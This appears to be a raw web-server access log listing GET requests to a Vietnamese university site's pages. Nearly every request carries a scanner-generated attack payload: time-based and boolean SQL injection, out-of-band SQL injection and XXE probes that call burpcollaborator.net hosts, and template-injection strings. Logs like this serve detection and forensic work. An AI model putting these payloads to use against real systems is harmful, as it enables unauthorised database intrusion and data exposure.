GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan'%20waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cntkrga6osmqcb5bi58lt9kx7aygqht5kv8svij7.burpcollab'%2b'orator.net%5cqff'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/16/cac-truong-doi-tac'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22utf-8%22%3f%3e%3c!doctype%20root%20[%20%3c!entity%20%25%20gpuvr%20system%20%22http%3a//929dpwfa18zykrk4euufi66tjkpcr2f633qtei.burpcollab'%7c%7c'orator.net/%22%3e%25gpuvr%3b]%3e')%2c'/l')%20from%20dual)%7c%7c'/,1
GET/index.php/2017/03/13/(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22utf-8%22%3f%3e%3c!doctype%20root%20[%20%3c!entity%20%25%20qxgnu%20system%20%22http%3a//r4wvrehs3q1gm9mmgcwxko8bl2ruswgz4wrmfb.burpcollab'%7c%7c'orator.net/%22%3e%25qxgnu%3b]%3e')%2c'/l')%20from%20dual)/,1
GET/index.php/2017/03/16/bieu-mau'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22utf-8%22%3f%3e%3c!doctype%20root%20[%20%3c!entity%20%25%20msnga%20system%20%22http%3a//jqdnd63kpin8818e24ip6gu37udmer2vqsdi17.burpcollab'%7c%7c'orator.net/%22%3e%25msnga%3b]%3e')%2c'/l')%20from%20dual)%7c%7c'/,1
GET/index.php/2017/03/13/van-phong-du-an'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22utf-8%22%3f%3e%3c!doctype%20root%20[%20%3c!entity%20%25%20qzjoi%20system%20%22http%3a//6biayto7a58vtot1nr3cr3fqshy9zdnhbey4mt.burpcollab'%7c%7c'orator.net/%22%3e%25qzjoi%3b]%3e')%2c'/l')%20from%20dual)%7c%7c'/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cucayzhpvbt9jucupof40srget5zx0yopfdc02or.burpcollab'%2b'orator.net%5cwwm'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa'(select*from(select(sleep(20)))a)'/,1
GET/index.php/2017/03/13/(select%20load_file('%5c%5c%5c%5cwhh04juxgvelzezrth92xtlgy74z5ztqves1ip7.burpcollaborator.net%5c%5coaf'))/,1
GET/index.php/2017/03/18/(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22utf-8%22%3f%3e%3c!doctype%20root%20[%20%3c!entity%20%25%20pwlma%20system%20%22http%3a//9eod1wrad8bywrw4qu6fu6itvk1c35r8f52vqk.burpcollab'%7c%7c'orator.net/%22%3e%25pwlma%3b]%3e')%2c'/l')%20from%20dual)/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan')waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c2eh61pr3d1brwkwxqn68uzimvd1528qzhnea4yt.burpcollab'%2b'orator.net%5cltm'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/16/cac-truong-doi-tac%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5csiew5fvthrfh0a0nudayypmcz35v7lvcl0in8bx.burpcollab'%2b'orator.net%5cykm'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/16/bieu-mau%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c0vw4in81uzspdidv7ln6bxzkcbi3j87zxnuaky9.burpcollab'%2b'orator.net%5cmdf'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22utf-8%22%3f%3e%3c!doctype%20root%20[%20%3c!entity%20%25%20qxgnu%20system%20%22http%3a//otlsgb6psnqdb6bj59lu9lx8azgrht5xtugk49.burpcollab'%7c%7c'orator.net/%22%3e%25qxgnu%3b]%3e')%2c'/l')%20from%20dual)%7c%7c'/,1
GET/index.php/2017/03/13/van-phong-du-an%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cgk4k73xhjfh52y2bw1cm0do01r7j8nwem2jp9dy.burpcollab'%2b'orator.net%5czzn'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5chpalc42iogm67z7c12hn5et16sckdl1ct0qngb5.burpcollab'%2b'orator.net%5cher'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm'%2b(select%20load_file('%5c%5c%5c%5cypr2cl2zoxmn7g7t1jh45vti69c1d11s4g13rrg.burpcollaborator.net%5c%5cxfe'))%2b'/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa'%2b(select*from(select(sleep(20)))a)%2b'/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22utf-8%22%3f%3e%3c!doctype%20root%20[%20%3c!entity%20%25%20pwlma%20system%20%22http%3a//9fpd2wsae8cyxrx4ru7fv6jtwk2c45s9g63wrl.burpcollab'%7c%7c'orator.net/%22%3e%25pwlma%3b]%3e')%2c'/l')%20from%20dual)%7c%7c'/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan'%2c0)waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cxfg12ksyewcmxfxsri73vujhw82033rujig56tv.burpcollab'%2b'orator.net%5ckdg'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/16/bieu-mau'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cd9nhw0me8c62rvr8ly1jpadxqowgxllcc09nzbo.burpcollab'%2b'orator.net%5ccta'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/16/cac-truong-doi-tac'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c2666tpj3513rokoxiny8mzamndt5vvjmaa7xxlm.burpcollab'%2b'orator.net%5coxj'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5ck8tov7ll7j59q2qfk50qohc4pvvnwpkga47rxfm.burpcollab'%2b'orator.net%5cjez'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/van-phong-du-an'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c749bruh8361wmpm2gswdk48rliraseg57t4gu4j.burpcollab'%2b'orator.net%5cxcz'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c0lm48ny1kzip3i3vxld61xpk2b8394xvqjn6du2.burpcollab'%2b'orator.net%5cvch'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm'/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa'%20and%20(select*from(select(sleep(20)))a)--%20/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan93423287'%20or%20'8079'%3d'8079/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cfdwj02qgcea4vxvap05ltchzuq0i2bq2gqdd31s.burpcollab'%2b'orator.net%5cpiw'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c87dcuvk9674xpqp3jtzen5bsojubvej5ct9gz4o.burpcollab'%2b'orator.net%5cbhl'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/16/bieu-mau)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cmvlqi98nulsbd4dh77nsbjz6cxipju7lz9wwmkb.burpcollab'%2b'orator.net%5csyq'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/16/cac-truong-doi-tac)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5czeh31mr0dybowhwuqk65uwijva123srjj7gu6iv.burpcollab'%2b'orator.net%5cswb'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cik6m75xjjhh7202dw3co0fo21t7l8nwen2kpadz.burpcollab'%2b'orator.net%5clvu'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/(select%20load_file('%5c%5c%5c%5cy542sliz4x2nngnthjx4lv9im9s1t2htjhg46sv.burpcollaborator.net%5c%5cago'))/,1
GET/index.php/2017/03/13/van-phong-du-an)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cnzqrmacoymwch5hib8rtfk37gymqnubl390wqkf.burpcollab'%2b'orator.net%5cnqy'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm'(select*from(select(sleep(20)))a)'/,1
GET/index.php/2017/03/13/(select%20load_file('%5c%5c%5c%5cirdme54jqho7909d33jo7fv28telfo3f532qseh.burpcollaborator.net%5c%5crss'))/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan34268774'%20or%20'3139'%3d'3145/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cbp4fcy2coam07t761whh58tv6mcee72ytmq9gx5.burpcollab'%2b'orator.net%5cscb'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/16/(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22utf-8%22%3f%3e%3c!doctype%20root%20[%20%3c!entity%20%25%20odidq%20system%20%22http%3a//0op4bn11nzlp6i6v0lg64xsk5bb3dv1ypvcl0a.burpcollab'%7c%7c'orator.net/%22%3e%25odidq%3b]%3e')%2c'/l')%20from%20dual)/,1
GET/index.php/2017/03/16/cac-truong-doi-tac')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5ctxuxkgauwsuifbfo9epzdq1de4kwmmad310oqcf.burpcollab'%2b'orator.net%5cofu'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cnofrba1onmlc656i08gt4ks75ybqcs0js7pufi4.burpcollab'%2b'orator.net%5cmoh'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/16/bieu-mau')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5ctwtxjg9uvstiebeo8eozcq0dd4jwk18s1gy3ord.burpcollab'%2b'orator.net%5csib'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt'%2b(select%20load_file('%5c%5c%5c%5ch8qlv4li7g56qzqck20noec1psvkwlkcn0knabz.burpcollaborator.net%5c%5chnk'))%2b'/,1
GET/index.php/2017/03/13/van-phong-du-an')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c66aattj7553vooo1irycm3aqnht9udi4bs8fy3n.burpcollab'%2b'orator.net%5cqiw'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm'%2b(select*from(select(sleep(20)))a)%2b'/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa'%20waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm'%2b(select%20load_file('%5c%5c%5c%5cojbs6bwpingd161jv9buzln80z6r7uvly9vwlka.burpcollaborator.net%5c%5cdfs'))%2b'/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan73656553'%20or%203594%3d3594--%20/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cgvfki38hufs5dydb71nmbdz0crijkc830rxen2c.burpcollab'%2b'orator.net%5cfeg'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22utf-8%22%3f%3e%3c!doctype%20root%20[%20%3c!entity%20%25%20odidq%20system%20%22http%3a//828cpvf917zxkqk3etuei56sjjpbr3f734quej.burpcollab'%7c%7c'orator.net/%22%3e%25odidq%3b]%3e')%2c'/l')%20from%20dual)%7c%7c'/,1
GET/index.php/2017/03/16/(select%20load_file('%5c%5c%5c%5czux3hm70tyrochcu6km5awyjbah2js7j976uwil.burpcollaborator.net%5c%5cwua'))/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5czor3bm10nylo6h6u0kg54wsj5ab2c40vtjq6gu5.burpcollab'%2b'orator.net%5cors'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/16/(select%20load_file('%5c%5c%5c%5cod5s0bqpcnadv6vjp95utlh8uz0r1wpnrboyem3.burpcollaborator.net%5c%5cusl'))/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt'/,1
GET/index.php/2017/03/13/(select%20load_file('%5c%5c%5c%5cn6urtajo5m3co5oii8ytmka7nytquuilk9hw7kw.burpcollaborator.net%5c%5caxa'))/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm'%20and%20(select*from(select(sleep(20)))a)--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm'/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan12289378'%20or%207681%3d7685--%20/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c2556spi3412rnknxhnx8lz9mmds5uxio8c5zvnk.burpcollab'%2b'orator.net%5cnwo'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cr91vwems8q6gr9rmlc1xpodbq2wuynmef2cp2dr.burpcollab'%2b'orator.net%5cfve'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa')waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/16/cac-truong-doi-tac'%2b(select%20load_file('%5c%5c%5c%5cxcd1zkpybw9mufusoi43sught8z01qphs5psfg4.burpcollaborator.net%5c%5clwk'))%2b'/,1
GET/index.php/2017/03/13/(select%20load_file('%5c%5c%5c%5chpalc42iogm67z7c12hn5et16sckdm1d310oqcf.burpcollaborator.net%5c%5crsj'))/,1
GET/index.php/2017/03/16/bieu-mau'%2b(select%20load_file('%5c%5c%5c%5cdarhx0ne9c72svs8my2jqaexroxgylmcp0mncb1.burpcollaborator.net%5c%5clkr'))%2b'/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt'(select*from(select(sleep(20)))a)'/,1
GET/index.php/2017/03/13/van-phong-du-an'%2b(select%20load_file('%5c%5c%5c%5cabpeyxoba98ztst5nv3gr7fuslydzhn8qwnjd72.burpcollaborator.net%5c%5csqp'))%2b'/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c6w3ajt97v5tveoe18rocc30qdhj9l19s0gx3nrc.burpcollab'%2b'orator.net%5crqd'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm'(select*from(select(sleep(20)))a)'/,1
GET/index.php/2017/03/18/(select%20load_file('%5c%5c%5c%5cfyhjl2bgxev4gxgaa0qlec2zfqlinbb2dqad01p.burpcollaborator.net%5c%5cnrr'))/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa'%2c0)waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan'%20and%20'8165'%3d'8165/,1
GET/index.php/2017/03/16/cac-truong-doi-tac'/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt'%2b(select%20load_file('%5c%5c%5c%5cvvuzii8wuuskdddq7gn1bszfc6iyj07raf72xqm.burpcollaborator.net%5c%5cuaf'))%2b'/,1
GET/index.php/2017/03/16/bieu-mau'/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt'%2b(select*from(select(sleep(20)))a)%2b'/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm'%20waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/van-phong-du-an'/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5ctc9xzgpubs9iubuooe4zsqgdt4zw1opfh3eq4et.burpcollab'%2b'orator.net%5cpxl'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm'%2b(select*from(select(sleep(20)))a)%2b'/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa52213262'%20or%20'1464'%3d'1464/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien'%2b(select%20load_file('%5c%5c%5c%5cvnmzai0wmukk5d5qzgf13srf46aycr0i360tqhf.burpcollaborator.net%5c%5colf'))%2b'/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan'%20and%20'7733'%3d'7738/,1
GET/index.php/2017/03/16/cac-truong-doi-tac'(select*from(select(sleep(20)))a)'/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt'/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt'%20and%20(select*from(select(sleep(20)))a)--%20/,1
GET/index.php/2017/03/16/bieu-mau'(select*from(select(sleep(20)))a)'/,1
GET/index.php/2017/03/13/van-phong-du-an'(select*from(select(sleep(20)))a)'/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm')waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c78dbvul8765wqpq2ks0do4crpivax2ltehb41sq.burpcollab'%2b'orator.net%5cfvn'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm'%20and%20(select*from(select(sleep(20)))a)--%20/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa28030699'%20or%20'9021'%3d'9029/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien'/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan'%20and%207750%3d7750--%20/,1
GET/index.php/2017/03/16/cac-truong-doi-tac'%2b(select*from(select(sleep(20)))a)%2b'/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt'(select*from(select(sleep(20)))a)'/,1
GET/index.php/2017/03/16/bieu-mau'%2b(select*from(select(sleep(20)))a)%2b'/,1
GET/index.php/2017/03/13/van-phong-du-an'%2b(select*from(select(sleep(20)))a)%2b'/,1
GET/index.php/2017/03/16/(select%20load_file('%5c%5c%5c%5cqtnugd6rspqfb8bl5blw9nxaa1gtil6c805nvbk.burpcollaborator.net%5c%5cgpb'))/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm'%2c0)waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa14689270'%20or%208530%3d8530--%20/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan'%20and%204785%3d4791--%20/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien'(select*from(select(sleep(20)))a)'/,1
GET/index.php/2017/03/16/cac-truong-doi-tac'%20and%20(select*from(select(sleep(20)))a)--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt'%2b(select*from(select(sleep(20)))a)%2b'/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt'%20waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/16/bieu-mau'%20and%20(select*from(select(sleep(20)))a)--%20/,1
GET/index.php/2017/03/13/van-phong-du-an'%20and%20(select*from(select(sleep(20)))a)--%20/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt'%2b(select%20load_file('%5c%5c%5c%5c8ktc7vx9j7hx2q23wtce05os1j7b93xu0ix5ntc.burpcollaborator.net%5c%5cbld'))%2b'/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm'%20waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm97856462'%20or%20'8798'%3d'8798/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa14963268'%20or%208013%3d8014--%20/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien'%2b(select*from(select(sleep(20)))a)%2b'/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt'%20and%20(select*from(select(sleep(20)))a)--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt')waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt'/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm')waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm83495218'%20or%20'8130'%3d'8135/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa'%20and%20'2772'%3d'2772/,1
GET/index.php/2017/03/16/cac-truong-doi-tac'%20waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien'%20and%20(select*from(select(sleep(20)))a)--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt'%2c0)waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/van-phong-du-an'%20waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/16/bieu-mau'%20waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm'%2c0)waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt'(select*from(select(sleep(20)))a)'/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa'%20and%20'1421'%3d'1425/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm67331687'%20or%206015%3d6015--%20/,1
GET/index.php/2017/03/16/cac-truong-doi-tac')waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt'%20waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt15597746'%20or%20'8300'%3d'8300/,1
GET/index.php/2017/03/16/bieu-mau')waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/van-phong-du-an')waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm67001147'%20or%20'9266'%3d'9266/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt'%2b(select*from(select(sleep(20)))a)%2b'/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa'%20and%208804%3d8804--%20/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan%7d%7dl0mua'/%22%3csxnr7/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm29368802'%20or%201309%3d1313--%20/,1
GET/index.php/2017/03/16/cac-truong-doi-tac'%2c0)waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien'%20waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt')waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/16/bieu-mau'%2c0)waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt'%20and%20(select*from(select(sleep(20)))a)--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt31885200'%20or%20'1709'%3d'1714/,1
GET/index.php/2017/03/13/van-phong-du-an'%2c0)waitfor%20delay'0%3a0%3a20'--/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa'%20and%203179%3d3186--%20/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm83730138'%20or%20'6157'%3d'6161/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan%25%7dyzjen'/%22%3cpnizo/,1
GET/index.php/2017/03/16/cac-truong-doi-tac31620214'%20or%20'2550'%3d'2550/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm'%20and%20'4363'%3d'4363/,1
